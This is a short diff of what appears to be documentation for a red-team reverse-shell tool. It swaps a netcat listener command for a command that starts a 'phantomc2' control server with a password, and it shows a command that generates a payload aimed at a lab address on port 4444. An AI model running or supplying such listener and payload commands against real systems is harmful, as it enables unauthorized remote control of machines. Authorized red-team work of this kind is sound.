@@ -337,7 +337,7 @@ Payload is verified before output.
 
 ```
 # Listener
-nc -lvnp 4444
+python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
 
 # Generate payload
 python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 2
